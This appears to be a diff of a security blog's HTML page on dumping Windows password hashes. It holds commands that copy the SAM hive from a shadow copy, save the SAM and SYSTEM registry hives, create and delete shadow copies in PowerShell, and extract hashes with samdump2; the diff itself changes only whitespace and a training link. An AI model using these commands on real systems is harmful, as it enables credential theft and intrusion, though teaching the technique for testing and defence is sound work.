@@ -58,13 +58,11 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy&lt;#_from_above&gt;\windows\
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy&lt;#_from_above&gt;\windows\system32\config\SAM .
 </code></pre></div>
 
-
 <p><a href="http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html">Reference</a></p>
 <h3>Registry Access</h3>
 <div class="codehilite"><pre><span></span><code>reg save hklm\sam SAM
 reg save hklm\system SYSTEM
 </code></pre></div>
-
 
 <p><a href="http://exfiltrated.com/tools.php#SAMExtract">Reference</a></p>
 <h3>PowerShell Script</h3>
@@ -76,7 +74,6 @@ $volume=(gwmi win32_shadowcopy -filter &quot;ID=&#39;$id&#39;&quot;)
 $volume.Delete();if($notrunning -eq 1){$service.Stop()}
 </code></pre></div>
 
-
 <p><a href="http://www.canhazcode.com/index.php?a=4">Reference</a></p>
 <h3>Finishing the Job</h3>
 <p>Use the following commands to finish the job. Both applications are included in the Kali default tool set.</p>
@@ -84,7 +81,7 @@ $volume.Delete();if($notrunning -eq 1){$service.Stop()}
 samdump2 SAM keyfile
 </code></pre></div>
 </div>
-<p>Like what you see? Join me for live training! See the <a href="/training/">Training</a> page for more information.</p>
+<p>Like what you see? Join me for live training! See the <a href="https://www.practisec.com/training/">Training</a> page for more information.</p>
 <hr>
 <div class="comments">
     <h6>Please share your thoughts, comments, and suggestions via Twitter.</h6>
